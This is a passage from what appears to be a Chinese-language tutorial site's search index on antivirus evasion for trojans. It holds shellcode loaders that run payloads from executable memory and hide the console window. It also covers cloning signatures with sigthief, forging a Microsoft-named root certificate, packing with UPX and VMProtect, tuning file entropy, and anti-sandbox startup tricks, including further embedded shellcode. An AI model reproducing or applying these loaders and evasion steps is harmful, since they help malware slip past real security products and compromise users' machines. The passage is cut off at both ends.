0x44,0xd6,0xf1,0xfe,0xa4,0x2b,0xe6,0x58,0xb4,0x1d,0x44,0xa5,0x84,0x82,0xa4,0x53,0x3c,0x56,0x4f,0x4e,0x1b,0x7c,0xb2,0x6b,0x2e,0xf4,0x01,0x5a,0x79,0xeb,0x4f,0x66,0x6f,0xec,0x25,0x40,0xd2,0x40,0x53,0x28,0x72,0x65,0xac,0x98,0x74,0x26,0x87,0x7b,0x9a,0x7a,0x1a,0x56,0xf0,0x49,0x72,0xfe,0x7e,0x48,0x17,0xa9,0xcc,0xd8,0x50,0x2a,0x47,0x1a,0x69,0x5b,0x02,0xd4,0xe1,0xec,0x1e,0x2d,0x09,0x03,0xd6,0x5d,0xdb,0xd0,0x67,0x89,0xfa,0x9f,0x0b,0x2f,0xb1,0xc8,0xb4,0x25,0xdb,0xaf,0x68,0xb5,0x85,0x54,0x62,0x86,0x4c,0x19,0xee,0xe4,0xdb,0x3b,0x89,0x39,0x4f,0x8a,0xe8,0xcd,0xb3,0xeb,0xea,0xe5,0x52,0xdd,0x49,0x69,0x7c,0xfc,0x22,0xc1,0x88,0x94,0xea,0xf0,0x44,0x67,0x70,0x6b,0xe4,0x8d,0x36,0x06,0xd6,0xa6,0xb1,0x53,0xaf,0xf7,0x46,0x6b,0x0e,0xc1,0x9d,0xc9,0x07,0x31,0x93,0xa2,0x7f,0x28,0x0b,0x88,0xa0,0x58,0x10,0xed,0xf6,0xed,0x2e,0xd8,0xb6,0x99,0x75,0xba,0x34,0xf2,0x38,0xc4,0xcf,0xf3,0x42,0xc3,0x9f,0x53,0xbc,0x57,0xff,0xd1,0x60,0x33,0x83,0x8c,0xe7,0x11,0xe0,0x39,0xe7,0xd2,0x0a,0x93,0x8a,0xb3,0xa3,0x89,0x23,0x96,0x8a,0x94,0xcf,0xf2,0x81,0xf2,0xff,0x65,0x7c,0xbe,0x14,0xb6,0x4a,0xf3,0x2a,0xe9,0x0c,0x52,0x08,0x4f,0xbc,0xc1,0x31,0xd1,0x12,0x25,0x2e,0x43,0x21,0x31,0x20,0x22,0xc5,0x92,0x48,0x9c,0x45,0x0e,0xfd,0x3a,0x1e,0x01,0xb0,0x78,0x0e,0x29,0x8d,0xa4,0x8d,0x1a,0x2f,0x9a,0xcf,0x58,0x21,0x5f,0x15,0x13,0x29,0x4d,0x3c,0x6d,0x68,0xe0,0x6e,0x76,0xa8,0xbc,0xad,0x61,0xd1,0x95,0xef,0xb7,0x18,0xfb,0xc5,0xb8,0x16,0xc7,0xa7,0x9a,0xd5,0x66,0x90,0xe7,0xe7,0x76,0xf9,0xdb,0xbc,0x60,0x33,0xec,0x67,0xf1,0x54,0xf3,0xd0,0xd4,0x88,0x67,0xb2,0x11,0x5b,0x28,0x47,0x24,0x8d,0x62,0x0b,0x98,0xe1,0x41,0x24,0xab,0x01,0x49,0x58,0x38,0x57,0x7f,0x3d,0xef,0xe4,0x45,0xa7,0x2b,0x6d,0x0e,0xe3,0xb1,0x67,0x03,0x13,0xf2,0x12,0x28,0x85,0xb5,0x50,0x3d,0x12,0x98,0xff,0x8c,0x15,0x4e,0x1d,0x36,0x92,0xb1,0x10,0x18,0xb2,0x49,0xe7,0x9f,0xa5,0xe0,0x41,0xc6,0x4d,0xc8,0xbe,0x4c,0x7d,0xad,0x7b,0x35,0x42,0x95,0xbd,0x3c,0xa3,0xe3,0x25,0x1e,0x6a,0xb2,0x98,0xf3,0x4a,0xa7,0xd8,0x75,0x2d,0x61,0x22,0xe2,0x28,0xaf,0xf4,0xb5,0xb2,0x76,0x39,0x28,0x68,0x52,0x2b,0xab,0xb5,0xc6,0x96,0xdb,0x71,0x84,0x78,0x40,0xf8,0xce,0x25,0xea,0x4d,0xb9,0x52,0x80,0x53,0x84,0x27,0xf2,0xfe,0x46,0xca,0x5a,0xc4,0x0a,0xc7,0x9f,0x0e,0x15,0x09,0x1d,0xf5,0x76,0x33,0x5a,0x43,0x48,0x51,0x3d,0x27,0x88,0x19,0x12,0x38,0xb0,0x6f,0x77,0x8f,0x05,0x32,0xc0,0x10,0xe2,0x85,0x03,0xe2,0x1b,0xdd,0xcc,0x6d,0xeb,0x99,0xac,0x9c,0xe7,0xae,0x4b,0x0e,0xc9,0x27,0xf1,0xbf,0x3f,0x90,0x18,0x07,0x3e,0xd6,0xd7,0x0a,0xa9,0x2c,0x32,0x4b,0x15,0xbf,0xef,0xeb,0x6f,0x52,0xe6,0xa0,0x19,0x3e,0x69,0x21,0xdc,0xf5,0x5a,0x1b,0x24,0x1f,0x37,0xda,0xf8,0x56,0x6c,0x62,0x7f,0x5a,0x02,0x3b,0xa5,0x1b,0xd8,0x2d,0x75,0x67,0x5e,0x6a,0xb9,0xd7,0x9b,0x83,0xfa,0x6b,0xa0,0x05,0xba,0x1b,0x7c,0xd3,0x13,0x79,0xc2,0x97,0x78,0x0f,0x0d,0xd0,0xcb,0xda,0x62,0x8d,0xfa,0x00,0x5f,0xc6,0xd7,0xcb,0x2f,0x30,0xf2,0xc0,0x90,0xfe,0xdf,0x99,0x3d,0xf2,0x8d,0x07,0x8b,0xb0,0xf6,0x95,0xb3,0x86,0x07,0x92,0xb6,0x1c,0x4a,0xaa,0x48,0x89,0x62,0x7b,0xda,0xfe,0x06,0x8b,0xd4,0x74,0x77,0x77,0x07,0xf9,0x75,0x33,0xb5,0xee,0x8a,0xa2,0x99,0xa5,0x33,0x7d,0xdb,0x81,0x32,0xaa,0x09,0xc0,0xa0,0x4a,0x5d,0x3d,0x59,0x66,0xc8,0x0e,0xd5,0x20,0x69,0x9d,0xa8,0x41,0xf9,0xd9,0xbd,0xa6,0xec,0xa2,0x2d,0x4c,0x10,0xbf,0xc2,0x64,0xfa,0x3a,0x6a,0x63,0xf2,0x0d,0xf0,0x7e,0x91,0xbb,0x38,0x2e,0x00,0x6c,0xed,0x80,0x3d,0x51,0xfd,0x25,0x72,0x20,0xf0,0xd8,0xa3,0xae,0x70,0xc2,0x63,0x70,0xa6,0x97,0x5b,0x38,0x92,0x7f,0xed,0xb3,0xe7,0x06,0x0c,0x71,0xf6,0x20,0x5f,0xa4,0xdc,0x6b,0x6b,0x8e,0xb3,0xe9,0x11,0x73,0x4f,0x5d,0x7c,0x44,0x8d,0xff,0xaa,0x36,0x13,0x8f,0xd7,0x28,0x24,0x0d,0xef,0xe6,0xb8,0x84,0x44,0xf8,0xaf,0x29,0x66,0xd6,0xa9,0xf0,0xa9,0xcb,0x0e,0x21,0xd5,0x60,0x2d,0x75,0x7a,0x66,0x6b,0xdc,0x52,0x04,0x63,0x5a,0x2c,0x41,0x33,0xcd,0x37,0x3e,0x88,0x95,0x69,0x5b,0x32,0x48,0x47,0x7a,0x48,0xae,0x53,0x19,0x71,0x37,0x68,0x80,0x77,0xc4,0x93,0x02,0x2d,0x16,0x99,0x3c,0x74,0xf9,0xfa,0x10,0x85,0x04,0xe5,0x7f,0x9e,0x33,0x95,0x25,0x38,0x90,0x27,0x25,0x8d,0x43,0xe8,0xd8,0xf6,0xab,0x46,0xa8,0x81,0x3c,0xff,0x3a,0xfa,0xb6,0xcb,0x37,0x68,0xcf,0x32,0xab,0xd8,0x49,0x65,0x2a,0xbe,0xa1,0x16,0xfb,0x42,0xa9,0x61,0x8d,0x52,0x0e,0x34,0xe8,0xc9,0xfc,0xec,0x88,0xf3,0xfe,0x71,0x60,0x44,0x71,0x7b,0xab,0x0a,0x6e,0xbc,0x01,0xe1,0x24,0x5b,0xf3,0x8c,0xb7,0xc6,0xa6,0x09,0xc4,0xbf,0xc7,0x7b,0x5b,0x05,0xe6,0x87,0x5e,0xb2,0x50,0x67,0x21,0xd5,0x3f,0xec,0x33,0xac,0x78,0x49,0xc4,0x3f,0xdd,0xad,0xd3,0x2e,0x3d,0x31,0x4c,0x11,0x59,0xca,0x8e,0x2a,0x5c,0x1f,0xe3,0xeb,0xa8,0x29,0xf9,0xfc,0x90,0x58,0xd9,0x16,0xc7,0x8f,0x63,0xf7,0xb4,0xb5,0xb5,0x3d,0xa4,0x0a,0x50,0x97,0xd4,0x95,0xc5,0xa5,0xb4,0xf5,0x21,0x48,0x8b,0x0c,0x24,0x48,0x83,0xec,0x08,0x81,0x01,0xd1,0x74,0x5d,0xf5,0xc1,0x49,0x04,0x8e,0x81,0x41,0x08,0xd5,0x01,0x9a,0x05,0x81,0x71,0x0c,0xf5,0x00,0xbe,0xda,0x51,0xc3 }; // \u6700\u597dsgn\u52a0\u5bc6\u4e00\u4e0b#pragma data_seg()\n#pragma comment(linker,\"/SECTION:vdata,RWE\")\n\nint main() {\n  ((void(*)()) &amp; sc)();\n  std::cout &lt;&lt; \"\";\n}\n</code></pre> <p>\u8fd0\u884c\u4e0a\u7ebf, \u6b63\u5e38\u6267\u884c\u7cfb\u7edf\u547d\u4ee4</p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#2","title":"2.\u7f16\u8bd1\u5668","text":""},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#21mingw","title":"2.1MinGW","text":"<p>\u4e5f\u5c31\u662f\u5e38\u8bf4\u7684gcc,64\u4f4d\u7cfb\u7edf\u5efa\u8bae\u9009\u62e9 x86_64-posix-sjlj , \u79fb\u52a8\u5230\u81ea\u5b9a\u4e49\u7684\u89e3\u538b\u8def\u5f84\u4e0b , \u89e3\u538b , \u6dfb\u52a0\u73af\u5883\u53d8\u91cf</p> <p></p> <pre><code>#include &lt;windows.h&gt;\n//#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\")\nvoid main() {\n    unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\"\n\"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\"\n\"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\"\n\"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\"\n\"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\"\n\"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\"\n\"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\"\n\"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\"\n\"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\"\n\"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\"\n\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\"\n\"\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n    LPVOID exec = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE,\n   PAGE_EXECUTE_READWRITE);\n    memcpy(exec, buf, sizeof(buf));\n    HANDLE hThread = CreateThread(\n   0,\n    0,\n    (LPTHREAD_START_ROUTINE)exec,\n    0,\n    0,\n    0);\n    WaitForSingleObject(hThread, -1);\n    CloseHandle(hThread);\n}\n</code></pre> <p>\u901a\u8fc7\u521b\u5efa\u7ebf\u7a0b\u8fd0\u884cshellcode</p> <p></p> <p>\u7f16\u8bd1\u547d\u4ee4</p> <pre><code>gcc test.c -mwindows -o test.exe\n\u901a\u8fc7 -mwindows \u53c2\u6570\u5c4f\u853d\u9ed1\u7a97\u53e3\n</code></pre> <p>\u4e00\u6837\u7684\u6e90\u4ee3\u7801,mingw\u7f16\u8bd1\u7684</p> <p></p> <p>clion\u7f16\u8bd1\u7684\uff1a</p> <p></p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#3exe","title":"3.exe\u5904\u7406","text":"<p>\u9488\u5bf9360\u7684qvm, \u7ecf\u5e38\u4eba\u5de5\u667a\u80fd\u62bd\u98ce, \u6709\u7684\u65f6\u5019\u771f\u7684\u4e0d\u662f\u4ee3\u7801\u95ee\u9898, \u800c\u662fqvm\u778e\u9e21\u513f\u62a5\u6bd2( \u8fd0\u884c\u5e93\u9009\u62e9\u4e86MT ), \u7f51\u4e0a\u516c\u5f00\u7684\u9488\u5bf9qvm\u7684\u5904\u7406\u4e5f\u662f\u901a\u8fc7\u52a0\u6570\u5b57\u7b7e\u540d\u548c\u52a0\u8d44\u6e90bypass</p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#31","title":"3.1\u52a0\u7b7e\u540d","text":"<p>\u6dfb\u52a0\u6570\u5b57\u7b7e\u540d</p> <pre><code>python3 sigthief.py -i \u7b7e\u540d\u6587\u4ef6 -t \u6837\u672c.exe -o \u8f93\u51fa.exe\npython3 sigthief.py -i sign_exe\\360.exe -t output.exe -o output_s.exe\n</code></pre> <p></p> <p>\u4f46\u662f\u8be5\u7b7e\u540d\u662f\u65e0\u6548\u7684\u7b7e\u540d, \u53ea\u80fd\u7528\u4e8e\u6a21\u62df\u6b63\u5e38\u7a0b\u5e8f</p> <p></p> <p>\u81ea\u7b7e\u540d\u8bc1\u4e66</p> <pre><code>\u7b2c\u4e00\u6b21\u521b\u5efa\u7b7e\u540d\u6587\u4ef6,\u4e2d\u95f4\u9700\u8981\u8f93\u5165\u5bc6\u7801\nmakecert -r -pe -n \"CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, \nL=Redmond, S=Washington, C=US\" -ss CA -sr CurrentUser -a sha256 -cy authority -sky \nsignature -sv Microsoft.pvk Microsoft.cer\ncertutil -user -addstore Root Microsoft.cer\nmakecert -pe -n \"CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, \nL=Redmond, S=Washington, C=US\" -a sha256 -cy end -sky signature -ic Microsoft.cer -iv \nMicrosoft.pvk -sv Microsoft.pvk Microsoft.cer\npvk2pfx -pvk Microsoft.pvk -spc Microsoft.cer -pfx Microsoft.pfx\n\u901a\u8fc7\u81ea\u7b7e\u540d\u6587\u4ef6\u6dfb\u52a0\u5230exe\nsigntool sign /f Microsoft.pfx /t http://timestamp.digicert.com /fd SHA256 \u8981\u7b7e\u540d\u7684.exe\n</code></pre> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#32","title":"3.2\u52a0\u8d44\u6e90","text":"<p>Resource Hacker \u6dfb\u52a0exe\u7a0b\u5e8f --&gt; \u64cd\u4f5c --&gt; \u4ece\u8d44\u6e90\u6587\u4ef6\u6dfb\u52a0</p> <p></p> <p></p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#33","title":"3.3\u52a0\u58f3","text":""},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#upx","title":"upx","text":"<p>upx\u662f\u4e00\u6b3e\u538b\u7f29\u58f3, \u9488\u5bf9exe\u6587\u4ef6\u8fdb\u884c\u4ee3\u7801\u538b\u7f29, \u538b\u7f29\u540e\u7684\u6587\u4ef6\u4f53\u79ef\u4f1a\u5c0f\u4e8e\u539f\u59cb\u6587\u4ef6</p> <p>UPX \u63d0\u4f9b\u4e86\u4e0d\u540c\u7684\u538b\u7f29\u7ea7\u522b\uff0c\u7ea7\u522b\u8d8a\u9ad8\uff0c\u538b\u7f29\u7387\u8d8a\u5927\uff0c\u4f46\u538b\u7f29\u548c\u89e3\u538b\u7f29\u7684\u901f\u5ea6\u53ef\u80fd\u4f1a\u51cf\u6162\u3002\u538b\u7f29\u7ea7\u522b\u8303 \u56f4\u662f\u4ece 1 \u5230 9\u3002\u6570\u5b57\u8d8a\u9ad8\uff0c\u8868\u793a\u538b\u7f29\u7ea7\u522b\u8d8a\u9ad8\uff0c\u5bf9\u6587\u4ef6\u5927\u5c0f\u7684\u51cf\u5c0f\u4e5f\u8d8a\u660e\u663e</p> <pre><code>upx -9 main.exe\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#shielden","title":"Shielden","text":"<p>Safengine Shielden \u8f6f\u4ef6\u4fdd\u62a4\u52a0\u58f3\u5de5\u5177\u662f\u4e00\u6b3e\u80fd\u591f\u5e2e\u52a9\u7528\u6237\u5bf9\u81ea\u5df1\u7535\u8111\u4e0a\u5404\u79cd\u6587\u4ef6\u7a0b\u5e8f\u8fdb\u884c\u52a0\u58f3\u514d\u6740\u7684 Windows\u64cd\u4f5c\u5e73\u53f0\u529f\u80fd\u6027\u4fdd\u62a4\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u7528\u6237\u5bf9\u81ea\u5df1\u9700\u8981\u8fdb\u884c\u4fdd\u62a4\u7684\u6587\u4ef6\u7a0b\u5e8f\u8fdb\u884c\u52a0\u58f3\u5904\u7406\u62e5\u6709 \u5f3a\u5927\u7684\u865a\u62df\u673a\u4ee3\u7801\u4fdd\u62a4\u7cfb\u7edf\uff0c\u80fd\u591f\u8ba9\u4f60\u7684\u6587\u4ef6\u7a0b\u5e8f\u65e0\u9700\u62c5\u5fc3\u88ab\u9006\u5411\u5de5\u7a0b\u7834\u89e3\u5165\u4fb5\uff0c\u62e5\u6709\u4e13\u4e1a\u7ea7\u7684\u52a0\u5bc6\u64cd \u4f5c\uff0c\u4fdd\u62a4\u4f60\u7684\u6587\u4ef6\u4e0d\u88ab\u6076\u610f\u4fee\u6539\u3002</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#vmp","title":"vmp","text":"<p>MProtect Software 3.5\u662f\u4e00\u6b3e\u7ed9\u8f6f\u4ef6\u589e\u52a0\u9632\u62a4\u7684\u5de5\u5177\u3002\u4fd7\u79f0vmp\u52a0\u58f3\u3002\u5b83\u80fd\u591f\u5e2e\u4f60\u7ed9\u8f6f\u4ef6\u52a0\u4e00\u5c42\u9632\u62a4\u3002\u9632\u6b62\u88ab\u7834\u89e3\u53cd\u7f16\u8bd1\u3002 \u6253\u5f00\u9009\u62e9exe\u6587\u4ef6, \u7136\u540e\u7f16\u8f91</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#34","title":"3.4\u6587\u4ef6\u7684\u71b5\u503c","text":"<p>Entropy\uff08\u71b5\uff09\u80fd\u88ab\u7528\u4e8e\u8861\u91cf\u7cfb\u7edf\u7684\u6df7\u4e71\u7a0b\u5ea6\uff0c\u71b5\u503c\u8d8a\u5927\uff0c\u8bf4\u660e\u6df7\u4e71\u7a0b\u5ea6\u8d8a\u9ad8\u3002\u71b5\u4e5f\u88ab\u7528\u4e8e\u68c0\u6d4bPE\u6587\u4ef6\u75c5\u6bd2, \u4e00\u822c\u4e00\u4e9b\u5408\u6cd5\u8f6f\u4ef6\u7684\u71b5\u503c\u5728 4.8 - 7.2 \u4e4b\u95f4 \u6709\u9636\u6bb5 \u6837\u672c</p> <p></p> <p>\u65e0\u9636\u6bb5 \u6837\u672c</p> <p></p> <p>\u6240\u4ee5\u6211\u4eec\u5236\u4f5c\u597d\u6837\u672c(\u52a0\u58f3), \u4e00\u5b9a\u8981\u68c0\u67e5\u6587\u4ef6\u7684\u71b5\u503c, \u7ecf\u91cf\u4fdd\u5b58\u5728 4.8 - 7.2 \u4e4b\u95f4</p>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html","title":"1.\u4ec0\u4e48\u662f\u6c99\u7bb1","text":""},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#11","title":"1.1\u4e91\u6c99\u7bb1\u7684\u80cc\u666f","text":"<p>\u968f\u7740\u4e92\u8054\u7f51\u7684\u53d1\u5c55\uff0c\u7f51\u7edc\u5b89\u5168\u95ee\u9898\u4e5f\u65e5\u76ca\u4e25\u5cfb\u3002\u6076\u610f\u8f6f\u4ef6\u3001\u7f51\u7edc\u653b\u51fb\u7b49\u5a01\u80c1\u4e0d\u65ad\u6d8c\u73b0\uff0c\u7ed9\u4e2a\u4eba\u7528\u6237\u548c\u4f01\u4e1a\u5e26\u6765\u4e86\u5de8\u5927\u7684\u635f\u5931\u3002\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e00\u95ee\u9898\uff0c\u4e91\u6c99\u7bb1\u6280\u672f\u5e94\u8fd0\u800c\u751f\u3002</p> <p>\u4e91\u6c99\u7bb1\u662f\u4e00\u79cd\u57fa\u4e8e\u865a\u62df\u5316\u6280\u672f\u7684\u5b89\u5168\u9632\u62a4\u673a\u5236\uff0c\u4e3b\u8981\u7528\u4e8e\u5bf9\u53ef\u7591\u6587\u4ef6\u3001\u6076\u610f\u4ee3\u7801\u8fdb\u884c\u5206\u6790\u548c\u68c0\u6d4b\u3002\u5176\u539f\u7406\u662f\u901a\u8fc7\u5728\u4e91\u7aef\u5efa\u7acb\u9694\u79bb\u7684\u865a\u62df\u73af\u5883\uff0c\u5c06\u5f85\u5206\u6790\u7684\u6587\u4ef6\u6216\u4ee3\u7801\u8fd0\u884c\u5728\u8fd9\u4e2a\u73af\u5883\u4e2d\uff0c\u4ee5\u6a21\u62df\u771f\u5b9e\u7684\u64cd\u4f5c\u7cfb\u7edf\u548c\u7f51\u7edc\u73af\u5883\u3002\u901a\u8fc7\u76d1\u63a7\u548c\u5206\u6790\u5176\u884c\u4e3a\uff0c\u53d1\u73b0\u5e76\u8bc6\u522b\u5176\u4e2d\u7684\u6076\u610f\u884c\u4e3a\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#12","title":"1.2\u4e91\u6c99\u7bb1\u7684\u5de5\u4f5c\u6d41\u7a0b","text":"<ol> <li>\u63d0\u4ea4\u6837\u672c\uff1a\u7528\u6237\u5c06\u6000\u7591\u5b58\u5728\u6076\u610f\u7684\u6587\u4ef6\u6216\u4ee3\u7801\u63d0\u4ea4\u7ed9\u4e91\u6c99\u7bb1\u7cfb\u7edf\u3002\u8fd9\u4e9b\u6837\u672c\u53ef\u80fd\u662f\u901a\u8fc7\u7535\u5b50\u90ae \u4ef6\u3001\u4e0b\u8f7d\u6216\u5176\u4ed6\u9014\u5f84\u83b7\u5f97\u7684\u3002</li> <li>\u73af\u5883\u9694\u79bb\uff1a\u4e91\u6c99\u7bb1\u7cfb\u7edf\u5c06\u5f85\u5206\u6790\u7684\u6837\u672c\u8fd0\u884c\u5728\u9694\u79bb\u7684\u865a\u62df\u73af\u5883\u4e2d\u3002\u8fd9\u4e2a\u865a\u62df\u73af\u5883\u4e0e\u771f\u5b9e\u7684\u64cd\u4f5c\u7cfb \u7edf\u548c\u7f51\u7edc\u73af\u5883\u76f8\u4f3c\uff0c\u4f46\u662f\u4e0e\u771f\u5b9e\u7cfb\u7edf\u5b8c\u5168\u9694\u79bb\uff0c\u4ee5\u9632\u6b62\u6837\u672c\u5bf9\u771f\u5b9e\u7cfb\u7edf\u7684\u4f24\u5bb3\u3002</li> <li>\u52a8\u6001\u884c\u4e3a\u5206\u6790\uff1a\u5728\u865a\u62df\u73af\u5883\u4e2d\uff0c\u4e91\u6c99\u7bb1\u7cfb\u7edf\u76d1\u63a7\u6837\u672c\u7684\u884c\u4e3a\u548c\u64cd\u4f5c\u3002\u5b83\u8bb0\u5f55\u6837\u672c\u7684\u6587\u4ef6\u64cd\u4f5c\u3001\u6ce8 \u518c\u8868\u4fee\u6539\u3001\u7f51\u7edc\u8fde\u63a5\u7b49\u884c\u4e3a\uff0c\u5e76\u751f\u6210\u884c\u4e3a\u65e5\u5fd7\u3002</li> <li>\u6076\u610f\u884c\u4e3a\u68c0\u6d4b\uff1a\u4e91\u6c99\u7bb1\u7cfb\u7edf\u4f7f\u7528\u5404\u79cd\u68c0\u6d4b\u6280\u672f\u6765\u5206\u6790\u6837\u672c\u7684\u884c\u4e3a\u65e5\u5fd7\uff0c\u4ee5\u786e\u5b9a\u5176\u4e2d\u662f\u5426\u5b58\u5728\u6076\u610f \u884c\u4e3a\u3002\u8fd9\u4e9b\u6280\u672f\u5305\u62ec\u57fa\u4e8e\u7279\u5f81\u7684\u68c0\u6d4b\u3001\u884c\u4e3a\u6a21\u5f0f\u5206\u6790\u3001\u673a\u5668\u5b66\u4e60\u7b49\u3002</li> <li>\u62a5\u544a\u751f\u6210\uff1a\u4e91\u6c99\u7bb1\u7cfb\u7edf\u6839\u636e\u5206\u6790\u7ed3\u679c\u751f\u6210\u62a5\u544a\u3002\u62a5\u544a\u4e2d\u5305\u542b\u6837\u672c\u7684\u57fa\u672c\u4fe1\u606f\u3001\u884c\u4e3a\u65e5\u5fd7\u3001\u6076\u610f\u884c \u4e3a\u68c0\u6d4b\u7ed3\u679c\u7b49\u3002\u8fd9\u4e9b\u62a5\u544a\u53ef\u4ee5\u5e2e\u52a9\u7528\u6237\u4e86\u89e3\u6837\u672c\u7684\u5a01\u80c1\u7a0b\u5ea6\u548c\u884c\u4e3a\u7279\u5f81\u3002</li> </ol>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#2","title":"2.\u4e3a\u4ec0\u4e48\u8981\u53cd\u6c99\u7bb1","text":"<p>\u53cd\u6c99\u7bb1\u662f\u6728\u9a6c\u514d\u6740\u4e2d\u6781\u4e3a\u91cd\u8981\u7684\u4e00\u4e2a\u6b65\u9aa4, \u5927\u90e8\u5206\u6740\u8f6f\u672c\u5730\u90fd\u4f1a\u6709\u4e00\u4e2a\u5185\u7f6e\u7684\u6c99\u7bb1/\u6216\u8005\u4e91\u4e0a\u6c99\u7bb1,\u5f53\u6211\u4eec\u60f3\u8981\u8fd0\u884c\u4e00\u4e2aexe\u65f6,\u90fd\u4f1a\u5728\u6c99\u7bb1\u4e2d\u6a21\u62df\u8fd0\u884c, \u8fdb\u884c\u68c0\u6d4b</p> <p>\u90a3\u4e48\u5982\u4f55\u8fdb\u884c\u53cd\u6c99\u7bb1\u5462?</p> <p>\u601d\u8003\u4e91\u6c99\u7bb1\u548c\u771f\u5b9e\u73af\u5883\u7684\u5dee\u5f02, \u6216\u8005\u662f\u4e91\u6c99\u7bb1\u9488\u5bf9\u4f60\u5f53\u524d\u7684\u73af\u5883\u7684\u5dee\u5f02, \u9488\u5bf9\u6027\u7684\u53cd\u6c99\u7bb1</p>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#3","title":"3.\u53cd\u6c99\u7bb1\u7684\u65b9\u6cd5","text":""},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#31","title":"3.1\u5206\u79bb\u52a0\u8f7d","text":"<p>\u672c\u5730\u6216\u8005\u7f51\u7edc, \u53c2\u8003\u4e4b\u524d</p>"},{"location":"CTF/Antimalware_evasion/AV/Article7/index.html#32","title":"3.2\u53c2\u6570\u542f\u52a8","text":"<p>\u6307\u7684\u662f\u5728\u542f\u52a8exe\u7684\u65f6\u5019, \u901a\u8fc7\u547d\u4ee4\u884c\u7684\u53c2\u6570\u542f\u52a8, \u63a8\u8350\u53c2\u6570\u4e00\u5b9a\u8981\u662f\u5f3a\u53c2\u6570</p> <pre><code>main.exe password\n</code></pre> <p>\u793a\u4f8b</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\u53e3\n\nunsigned char sc[] =\n\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\"\n\"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\"\n\"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\"\n\"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\"\n\"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\"\n\"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\"\n\"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\"\n\"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\"\n\"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\